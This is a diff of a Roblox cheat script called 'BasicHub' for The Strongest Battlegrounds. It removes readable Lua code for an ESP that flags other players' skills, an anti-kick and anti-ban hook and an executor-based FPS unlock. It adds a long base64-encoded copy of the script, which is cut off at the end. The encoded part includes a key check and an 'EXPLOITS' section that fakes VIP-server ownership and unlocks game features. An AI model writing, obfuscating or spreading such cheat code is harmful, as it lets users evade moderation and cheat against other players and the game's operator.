-    TweenService:Create(dcFrame, TweenInfo.new(0.025), {
-        Position = UDim2.new(
-            dcDragStartPos.X.Scale, dcDragStartPos.X.Offset + delta.X,
-            dcDragStartPos.Y.Scale, dcDragStartPos.Y.Offset + delta.Y
-        ),
-    }):Play()
-end
-dcFrame.InputBegan:Connect(function(input)
-    if (input.UserInputType == Enum.UserInputType.MouseButton1 or
-        input.UserInputType == Enum.UserInputType.Touch) and
-        UserInputService:GetFocusedTextBox() == nil then
-        dcToggle       = true
-        dcDragStart    = input.Position
-        dcDragStartPos = dcFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dcToggle = false
-            end
-        end)
-    end
-end)
-dcFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or
-       input.UserInputType == Enum.UserInputType.Touch then
-        dcDragInput = input
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if input == dcDragInput and dcToggle then
-        applyDCDrag(input)
-    end
-end)
-
--- DC ESP skill detection
-local dcStrongSkills = {
-    ["Omni Directional Punch"] = true, ["Death Counter"] = true,
-    ["Serious Punch"] = true,          ["Table Flip"]    = true,
-}
-local dcWeakSkills = {
-    ["Consecutive Punches"] = true, ["Normal Punch"] = true,
-    ["Shove"] = true, ["Uppercut"] = true,
-}
-local dcState = {}
-
-local function dcCreateBillboard(char, text)
-    if not (char and char:FindFirstChild("Head")) then return end
-    local head = char.Head
-    local bb   = head:FindFirstChild("DC_SkillTag") or Instance.new("BillboardGui")
-    bb.Name        = "DC_SkillTag"
-    bb.Size        = UDim2.new(0, 80, 0, 34)
-    bb.StudsOffset = Vector3.new(0, 3, 0)
-    bb.Adornee     = head
-    bb.AlwaysOnTop = true
-    if not bb.Parent then bb.Parent = head end
-    local lbl = bb:FindFirstChild("TextLabel") or Instance.new("TextLabel", bb)
-    lbl.Size                     = UDim2.new(1, 0, 1, 0)
-    lbl.BackgroundTransparency   = 1
-    lbl.Font                     = Enum.Font.GothamBold
-    lbl.TextScaled               = true
-    lbl.TextColor3               = Color3.new(1, 1, 1)
-    lbl.TextStrokeTransparency   = 0.4
-    lbl.Text                     = text
-end
-
-local function dcRemoveBillboard(char)
-    if char and char:FindFirstChild("Head") then
-        local t = char.Head:FindFirstChild("DC_SkillTag")
-        if t then t:Destroy() end
-    end
-end
-
-local function dcGetSkillType(backpack)
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if dcStrongSkills[tool.Name] then return "strong" end
-        if dcWeakSkills[tool.Name]   then return "weak"   end
-    end
-end
-
-RunService.Heartbeat:Connect(function()
-    if not dcEspOn or not dcFrame.Visible then return end
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer then
-            local char     = plr.Character
-            local backpack = plr:FindFirstChildOfClass("Backpack")
-            if char and backpack then
-                local skillType = dcGetSkillType(backpack)
-                local lastState = dcState[plr]
-                if not lastState then
-                    dcState[plr] = skillType
-                    if skillType == "strong" then dcCreateBillboard(char, "DeathCounter")
-                    else dcRemoveBillboard(char) end
-                else
-                    if skillType == "strong" then
-                        if lastState ~= "strong" then dcCreateBillboard(char, "DeathCounter") end
-                        dcState[plr] = "strong"
-                    elseif skillType == "weak" and lastState == "strong" then
-                        dcState[plr] = "weak"
-                        dcRemoveBillboard(char)
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- Player leave: clean up state
-Players.PlayerRemoving:Connect(function(plr)
-    dcState[plr] = nil
-end)
-
--- Tab button to show/hide DC ESP window
-local dcWindowOpen = false
-espTab:CreateButton({
-    Name = "Toggle DC ESP Window",
-    Callback = function()
-        dcWindowOpen = not dcWindowOpen
-        dcFrame.Visible = dcWindowOpen
-    end,
-})
-
--------------------------------------------------------------------------------
--- ═══ TAB: MISC ═══
--------------------------------------------------------------------------------
-local miscTab = Window:CreateTab("⚙️ Misc", "settings")
-
-miscTab:CreateSection("Player")
-miscTab:CreateButton({
-    Name = "Reset Character",
-    Callback = function()
-        if humanoid then humanoid.Health = 0 end
-    end,
-})
-miscTab:CreateButton({
-    Name = "Copy Server ID",
-    Callback = function()
-        pcall(function() (setclipboard or toclipboard)(game.JobId) end)
-        Rayfield:Notify({ Title="Copied", Content="Server ID copied!", Duration=2, Image=4483362458 })
-    end,
-})
-
-miscTab:CreateDivider()
-miscTab:CreateSection("Performance")
-
-miscTab:CreateButton({
-    Name = "FPS Unlocker (9999)",
-    Callback = function()
-        local ok = pcall(function() setfpscap(9999) end)
-        Rayfield:Notify({
-            Title   = "FPS Unlocker",
-            Content = ok and "FPS cap set to 9999!" or "setfpscap not supported by your executor.",
-            Duration = 3,
-            Image   = 4483362458,
-        })
-    end,
-})
-
-miscTab:CreateButton({
-    Name = "Open Developer Console",
-    Callback = function()
-        pcall(function()
-            game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
-        end)
-    end,
-})
-
-miscTab:CreateDivider()
-miscTab:CreateSection("Protection")
-
-local AntiDCActive = false
-local AntiDCConn   = nil
-miscTab:CreateToggle({
-    Name = "Anti-Disconnect",
-    CurrentValue = false,
-    Flag = "AntiDC",
-    Callback = function(v)
-        AntiDCActive = v
-        if v then
-            AntiDCConn = RunService.Heartbeat:Connect(function()
-                pcall(function()
-                    -- Suppress kick RemoteEvents fired to client
-                    local rs = game:GetService("ReplicatedStorage")
-                    for _, obj in pairs(rs:GetDescendants()) do
-                        if obj:IsA("RemoteEvent") and
-                           (obj.Name:lower():find("kick") or obj.Name:lower():find("ban")) then
-                            obj.OnClientEvent:Connect(function() end)
-                        end
-                    end
-                end)
-            end)
-        else
-            if AntiDCConn then AntiDCConn:Disconnect(); AntiDCConn = nil end
-        end
-    end,
-})
-
-miscTab:CreateDivider()
-miscTab:CreateSection("About")
-miscTab:CreateParagraph({
-    Title   = "BasicHub | The Strongest Battlegrounds",
-    Content = "UI Library  : Custom (BasicHub)\n"
-           .. "Key System  : PlatoBoost\n"
-           .. "Game        : The Strongest Battlegrounds\n"
-           .. "Press K     : Toggle UI",
-})
-
--------------------------------------------------------------------------------
--- READY
--------------------------------------------------------------------------------
-Rayfield:Notify({
-    Title   = "✅ BasicHub Loaded!",
-    Content = "Welcome, " .. LocalPlayer.Name .. "! Press K to toggle UI.",
-    Duration = 5,
-    Image   = 4483362458,
-})
-
+local _x="LS0gUHJvdGVjdGlvbgpsb2NhbCBQcm90ZWN0aW9uQ29uZmlnID0geyBTZWNyZXRLZXkgPSAiVFNCQ29kZTEyMzQiLCBIdWJOYW1l
+.."ID0gIkJhc2ljSHViIiB9CmlmIG5vdCBfR1tQcm90ZWN0aW9uQ29uZmlnLlNlY3JldEtleV0gdGhlbgogICAgbG9jYWwgcCA9IGdh
+.."bWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICBpZiBwIHRoZW4gcDpLaWNrKCJcbiBVbmF1dGhvcml6ZWQg
+.."RXhlY3V0aW9uIFxuXG5Vc2UgdGhlIG9mZmljaWFsIEJhc2ljSHViIGtleSBzeXN0ZW0uIikgZW5kCiAgICByZXR1cm4KZW5kCgot
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tCi0tIFNFUlZJQ0VTCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwgUnVuU2VydmljZSAgICAgICA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIp
+.."CmxvY2FsIFR3ZWVuU2VydmljZSAgICAgPSBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCmxvY2FsIFVzZXJJbnB1dFNl
+.."cnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQpsb2NhbCBQbGF5ZXJzICAgICAgICAgID0gZ2FtZTpH
+.."ZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgSHR0cFNlcnZpY2UgICAgICA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2Ui
+.."KQpsb2NhbCBMb2NhbFBsYXllciAgID0gUGxheWVycy5Mb2NhbFBsYXllcgoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSBDSEFSQUNURVIgUkVGRVJFTkNFUyAg
+.."KGF1dG8tdXBkYXRlIG9uIHJlc3Bhd24pCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwgY2hhcmFjdGVyLCBodW1hbm9pZCwgaHVtYW5vaWRSb290UGFydAoK
+.."bG9jYWwgZnVuY3Rpb24gcmVmcmVzaENoYXJhY3RlcihjaGFyKQogICAgY2hhcmFjdGVyICAgICAgICAgID0gY2hhcgogICAgaHVt
+.."YW5vaWQgICAgICAgICAgID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgIGh1bWFub2lkUm9vdFBhcnQgICA9IGNo
+.."YXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKZW5kCgppZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiByZWZy
+.."ZXNoQ2hhcmFjdGVyKExvY2FsUGxheWVyLkNoYXJhY3RlcikgZW5kCkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3Qo
+.."cmVmcmVzaENoYXJhY3RlcikKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0gRVhQTE9JVFMgIChjbGllbnQtc2lkZSBhdHRyaWJ1dGUgdW5sb2NrcyB1c2VkIGJ5
+.."IFRTQikKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLQpsb2NhbCBmdW5jdGlvbiBhcHBseUV4cGxvaXRzKCkKICAgIGxvY2FsIG5hbWUgPSBMb2NhbFBsYXllci5OYW1l
+.."CiAgICBsb2NhbCB1aWQgID0gdG9zdHJpbmcoTG9jYWxQbGF5ZXIuVXNlcklkKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAg
+.."IGlmIHdvcmtzcGFjZTpHZXRBdHRyaWJ1dGUoIlZJUFNlcnZlciIpICAgICAgfj0gdWlkICB0aGVuIHdvcmtzcGFjZTpTZXRBdHRy
+.."aWJ1dGUoIlZJUFNlcnZlciIsICAgICAgdWlkKSAgZW5kCiAgICAgICAgaWYgd29ya3NwYWNlOkdldEF0dHJpYnV0ZSgiVklQU2Vy
+.."dmVyT3duZXIiKSB+PSBuYW1lIHRoZW4gd29ya3NwYWNlOlNldEF0dHJpYnV0ZSgiVklQU2VydmVyT3duZXIiLCBuYW1lKSBlbmQK
+.."ICAgICAgICBpZiB3b3Jrc3BhY2U6R2V0QXR0cmlidXRlKCJOb0Rhc2hDb29sZG93biIpID09IG5pbCAgdGhlbiB3b3Jrc3BhY2U6
+.."U2V0QXR0cmlidXRlKCJOb0Rhc2hDb29sZG93biIsIGZhbHNlKSBlbmQKICAgICAgICBpZiB3b3Jrc3BhY2U6R2V0QXR0cmlidXRl
+.."KCJOb0ZhdGlndWUiKSAgICAgID09IG5pbCAgdGhlbiB3b3Jrc3BhY2U6U2V0QXR0cmlidXRlKCJOb0ZhdGlndWUiLCAgICAgIGZh
+.."bHNlKSBlbmQKICAgICAgICBpZiBMb2NhbFBsYXllcjpHZXRBdHRyaWJ1dGUoIkV4dHJhU2xvdHMiKSAgID09IG5pbCAgdGhlbiBM
+.."b2NhbFBsYXllcjpTZXRBdHRyaWJ1dGUoIkV4dHJhU2xvdHMiLCAgIGZhbHNlKSBlbmQKICAgICAgICBpZiBMb2NhbFBsYXllcjpH
+.."ZXRBdHRyaWJ1dGUoIkVtb3RlU2VhcmNoQmFyIik9PSBuaWwgdGhlbiBMb2NhbFBsYXllcjpTZXRBdHRyaWJ1dGUoIkVtb3RlU2Vh
+.."cmNoQmFyIixmYWxzZSkgZW5kCiAgICBlbmQpCmVuZAphcHBseUV4cGxvaXRzKCkKTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6
+.."Q29ubmVjdChhcHBseUV4cGxvaXRzKQoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSBDVVNUT00gR1VJIExJQlJBUlkgIChSYXlmaWVsZC1jb21wYXRpYmxlIEFQ
+.."SSkKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLQpsb2NhbCBmdW5jdGlvbiBNYWtlQmFzaWNIdWJMaWIoKQogICAgbG9jYWwgbGliID0ge30KCiAgICAtLSDilIDilIAg
+.."U2NyZWVuR3VpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgbG9jYWwgY29yZUd1aSA9IGdhbWU6R2V0U2Vy
+.."dmljZSgiQ29yZUd1aSIpCiAgICBsb2NhbCBndWlSb290CiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgaWYgZ3VpUm9vdCB0
+.."aGVuIHJldHVybiBlbmQKICAgICAgICBsb2NhbCBzZyA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgICAgICBzZy5OYW1l
+.."ICAgICAgICAgICA9ICJCYXNpY0h1Yl9HVUkiCiAgICAgICAgc2cuUmVzZXRPblNwYXduICAgPSBmYWxzZQogICAgICAgIHNnLlpJ
+.."bmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nCiAgICAgICAgc2cuUGFyZW50ICAgICAgICAgPSBjb3Jl
+.."R3VpCiAgICAgICAgZ3VpUm9vdCAgICAgICAgICAgPSBzZwogICAgZW5kKQogICAgaWYgbm90IGd1aVJvb3QgdGhlbgogICAgICAg
+.."IGxvY2FsIHNnID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgICAgIHNnLk5hbWUgICAgICAgICA9ICJCYXNpY0h1Yl9H
+.."VUkiCiAgICAgICAgc2cuUmVzZXRPblNwYXduID0gZmFsc2UKICAgICAgICBzZy5QYXJlbnQgICAgICAgPSBMb2NhbFBsYXllcjpX
+.."YWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCiAgICAgICAgZ3VpUm9vdCAgICAgICAgID0gc2cKICAgIGVuZAoKICAgIC0tIOKUgOKU
+.."gCBEaW1lbnNpb25zICYgY29sb3VycyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIAKICAgIGxvY2FsIFNJREVCQVJfVyA9IDE0OAogICAgbG9jYWwgV0lORE9XX1cgID0gNTQw
+.."CiAgICBsb2NhbCBXSU5ET1dfSCAgPSA0MjAKICAgIGxvY2FsIFRPUEJBUl9IICA9IDM4CgogICAgbG9jYWwgQ19XSU5fQkcgID0g
+.."Q29sb3IzLmZyb21SR0IoOCwgICAxMCwgIDIyICkKICAgIGxvY2FsIENfVE9QX0JHICA9IENvbG9yMy5mcm9tUkdCKDEwLCAgMTQs
+.."ICAyOCApCiAgICBsb2NhbCBDX1NJREVfQkcgPSBDb2xvcjMuZnJvbVJHQig2LCAgIDgsICAgMTggKQogICAgbG9jYWwgQ19DT05U
+.."X0JHID0gQ29sb3IzLmZyb21SR0IoOCwgICAxMiwgIDI0ICkKICAgIGxvY2FsIENfRUxFTV9CRyA9IENvbG9yMy5mcm9tUkdCKDE0
+.."LCAgMTgsICAzNiApCiAgICBsb2NhbCBDX1RFWFQgICAgPSBDb2xvcjMuZnJvbVJHQigyMTUsIDIzMCwgMjU1KQogICAgbG9jYWwg
+.."Q19TVUIgICAgID0gQ29sb3IzLmZyb21SR0IoMTMwLCAxNTAsIDE5MCkKICAgIGxvY2FsIENfQUNDRU5UICA9IENvbG9yMy5mcm9t
+.."UkdCKDAsICAgMjAwLCAyNTUpCiAgICBsb2NhbCBDX1RPR19PTiAgPSBDb2xvcjMuZnJvbVJHQigwLCAgIDIxMCwgMTIwKQogICAg
+.."bG9jYWwgQ19UT0dfT0ZGID0gQ29sb3IzLmZyb21SR0IoMjUsICAzMiwgIDYwICkKCiAgICAtLSDilIDilIAgTWFpbiB3aW5kb3cg
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBsb2NhbCBNYWluRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgZ3Vp
+.."Um9vdCkKICAgIE1haW5GcmFtZS5OYW1lICAgICAgICAgICAgID0gIk1haW5XaW5kb3ciCiAgICBNYWluRnJhbWUuU2l6ZSAgICAg
+.."ICAgICAgICA9IFVEaW0yLm5ldygwLCBXSU5ET1dfVywgMCwgV0lORE9XX0gpCiAgICBNYWluRnJhbWUuUG9zaXRpb24gICAgICAg
+.."ICA9IFVEaW0yLm5ldygwLjUsIC1XSU5ET1dfVy8yLCAwLjUsIC1XSU5ET1dfSC8yKQogICAgTWFpbkZyYW1lLkJhY2tncm91bmRD
+.."b2xvcjMgPSBDX1dJTl9CRwogICAgTWFpbkZyYW1lLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29y
+.."bmVyIiwgTWFpbkZyYW1lKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKCiAgICAtLSBDb3NtaWMtYmx1ZSBiYWNrZ3Jv
+.."dW5kIGdyYWRpZW50CiAgICBsb2NhbCBiZ0dyYWQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBNYWluRnJhbWUpCiAgICBi
+.."Z0dyYWQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCAgIENv
+.."bG9yMy5mcm9tUkdCKDEwLCAxNiwgNDApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNSwgQ29sb3IzLmZy
+.."b21SR0IoNSwgIDgsICAyMikpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgICBDb2xvcjMuZnJvbVJHQig4
+.."LCAgMTgsIDQ0KSksCiAgICB9KQogICAgYmdHcmFkLlJvdGF0aW9uID0gMTM1CgogICAgLS0gUmFpbmJvdyBib3JkZXIKICAgIGxv
+.."Y2FsIGJvcmRlclN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBNYWluRnJhbWUpCiAgICBib3JkZXJTdHJva2UuVGhp
+.."Y2tuZXNzICAgICAgID0gMgogICAgYm9yZGVyU3Ryb2tlLkFwcGx5U3Ryb2tlTW9kZSA9IEVudW0uQXBwbHlTdHJva2VNb2RlLkJv
+.."cmRlcgogICAgYm9yZGVyU3Ryb2tlLkxpbmVKb2luTW9kZSAgICA9IEVudW0uTGluZUpvaW5Nb2RlLlJvdW5kCiAgICBkbwogICAg
+.."ICAgIGxvY2FsIGh1ZSA9IDAKICAgICAgICBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAg
+.."ICAgaWYgbm90IGJvcmRlclN0cm9rZS5QYXJlbnQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGh1ZSA9IChodWUgKyAwLjAw
+.."MTUpICUgMQogICAgICAgICAgICBib3JkZXJTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbUhTVihodWUsIDEsIDEpCiAgICAgICAg
+.."ZW5kKQogICAgZW5kCgogICAgLS0gVG9wIGJhcgogICAgbG9jYWwgVG9wQmFyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIE1haW5G
+.."cmFtZSkKICAgIFRvcEJhci5TaXplICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIDAsIDAsIFRPUEJBUl9IKQogICAgVG9wQmFy
+.."LkJhY2tncm91bmRDb2xvcjMgPSBDX1RPUF9CRwogICAgVG9wQmFyLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICBJbnN0YW5jZS5u
+.."ZXcoIlVJQ29ybmVyIiwgVG9wQmFyKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKICAgIGxvY2FsIHRvcFBhdGNoID0g
+.."SW5zdGFuY2UubmV3KCJGcmFtZSIsIFRvcEJhcikKICAgIHRvcFBhdGNoLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwg
+.."MCwgMC41LCAwKQogICAgdG9wUGF0Y2guUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLCAwLCAwLjUsIDApCiAgICB0b3BQ
+.."YXRjaC5CYWNrZ3JvdW5kQ29sb3IzID0gQ19UT1BfQkcKICAgIHRvcFBhdGNoLkJvcmRlclNpemVQaXhlbCAgPSAwCgogICAgbG9j
+.."YWwgVGl0bGVMYmwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIFRvcEJhcikKICAgIFRpdGxlTGJsLlNpemUgICAgICAgICAg
+.."ICAgICA9IFVEaW0yLm5ldygxLCAtNzAsIDEsIDApCiAgICBUaXRsZUxibC5Qb3NpdGlvbiAgICAgICAgICAgPSBVRGltMi5uZXco
+.."MCwgMTIsIDAsIDApCiAgICBUaXRsZUxibC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgVGl0bGVMYmwuVGV4dENvbG9y
+.."MyAgICAgICAgID0gQ19URVhUCiAgICBUaXRsZUxibC5Gb250ICAgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtQm9sZAog
+.."ICAgVGl0bGVMYmwuVGV4dFNpemUgICAgICAgICAgID0gMTQKICAgIFRpdGxlTGJsLlRleHRYQWxpZ25tZW50ICAgICA9IEVudW0u
+.."VGV4dFhBbGlnbm1lbnQuTGVmdAogICAgVGl0bGVMYmwuVGV4dCAgICAgICAgICAgICAgID0gIkJhc2ljSHViIgoKICAgIGxvY2Fs
+.."IENsb3NlQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgVG9wQmFyKQogICAgQ2xvc2VCdG4uU2l6ZSAgICAgICAgICAg
+.."ICAgPSBVRGltMi5uZXcoMCwgMjYsIDAsIDI2KQogICAgQ2xvc2VCdG4uUG9zaXRpb24gICAgICAgICAgPSBVRGltMi5uZXcoMSwg
+.."LTMyLCAwLjUsIC0xMykKICAgIENsb3NlQnRuLkJhY2tncm91bmRDb2xvcjMgID0gQ29sb3IzLmZyb21SR0IoMTkwLCA0MCwgNDAp
+.."CiAgICBDbG9zZUJ0bi5UZXh0ICAgICAgICAgICAgICA9ICLinJUiCiAgICBDbG9zZUJ0bi5UZXh0Q29sb3IzICAgICAgICA9IENv
+.."bG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBDbG9zZUJ0bi5Gb250ICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3Ro
+.."YW1Cb2xkCiAgICBDbG9zZUJ0bi5UZXh0U2l6ZSAgICAgICAgICA9IDExCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgQ2xv
+.."c2VCdG4pLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCgogICAgbG9jYWwgd2luVmlzaWJsZSA9IHRydWUKICAgIENsb3Nl
+.."QnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIE1haW5GcmFtZS5WaXNpYmxlID0gZmFsc2UK
+.."ICAgICAgICB3aW5WaXNpYmxlICAgICAgICA9IGZhbHNlCiAgICBlbmQpCgogICAgLS0gVG9wQmFyIGRyYWcgIChSYXlmaWVsZC1z
+.."dHlsZTogZHJhZ0lucHV0IHRyYWNraW5nICsgaW5wdXQuQ2hhbmdlZCBlbmQgZGV0ZWN0aW9uKQogICAgbG9jYWwgZHJhZ1RvZ2ds
+.."ZSwgZHJhZ0lucHV0LCBkcmFnU3RhcnQsIGRyYWdTdGFydFBvcyA9IGZhbHNlLCBuaWwsIG5pbCwgbmlsCiAgICBsb2NhbCBmdW5j
+.."dGlvbiBhcHBseURyYWcoaW5wdXQpCiAgICAgICAgbG9jYWwgZGVsdGEgPSBpbnB1dC5Qb3NpdGlvbiAtIGRyYWdTdGFydAogICAg
+.."ICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbkZyYW1lLCBUd2VlbkluZm8ubmV3KDAuMDI1KSwgewogICAgICAgICAgICBQb3Np
+.."dGlvbiA9IFVEaW0yLm5ldygKICAgICAgICAgICAgICAgIGRyYWdTdGFydFBvcy5YLlNjYWxlLCBkcmFnU3RhcnRQb3MuWC5PZmZz
+.."ZXQgKyBkZWx0YS5YLAogICAgICAgICAgICAgICAgZHJhZ1N0YXJ0UG9zLlkuU2NhbGUsIGRyYWdTdGFydFBvcy5ZLk9mZnNldCAr
+.."IGRlbHRhLlkKICAgICAgICAgICAgKSwKICAgICAgICB9KTpQbGF5KCkKICAgIGVuZAogICAgVG9wQmFyLklucHV0QmVnYW46Q29u
+.."bmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICBpZiAoaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUu
+.."TW91c2VCdXR0b24xIG9yCiAgICAgICAgICAgIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNo
+.."KSBhbmQKICAgICAgICAgICAgVXNlcklucHV0U2VydmljZTpHZXRGb2N1c2VkVGV4dEJveCgpID09IG5pbCB0aGVuCiAgICAgICAg
+.."ICAgIGRyYWdUb2dnbGUgICA9IHRydWUKICAgICAgICAgICAgZHJhZ1N0YXJ0ICAgID0gaW5wdXQuUG9zaXRpb24KICAgICAgICAg
+.."ICAgZHJhZ1N0YXJ0UG9zID0gTWFpbkZyYW1lLlBvc2l0aW9uCiAgICAgICAgICAgIGlucHV0LkNoYW5nZWQ6Q29ubmVjdChmdW5j
+.."dGlvbigpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRTdGF0ZSA9PSBFbnVtLlVzZXJJbnB1dFN0YXRlLkVuZCB0
+.."aGVuCiAgICAgICAgICAgICAgICAgICAgZHJhZ1RvZ2dsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAg
+.."ZW5kKQogICAgICAgIGVuZAogICAgZW5kKQogICAgVG9wQmFyLklucHV0Q2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQog
+.."ICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgb3IKICAgICAg
+.."ICAgICBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgIGRyYWdJ
+.."bnB1dCA9IGlucHV0CiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBVc2VySW5wdXRTZXJ2aWNlLklucHV0Q2hhbmdlZDpDb25uZWN0
+.."KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIGlucHV0ID09IGRyYWdJbnB1dCBhbmQgZHJhZ1RvZ2dsZSB0aGVuCiAgICAgICAg
+.."ICAgIGFwcGx5RHJhZyhpbnB1dCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICAtLSBLIHRvZ2dsZQogICAgVXNlcklucHV0U2Vy
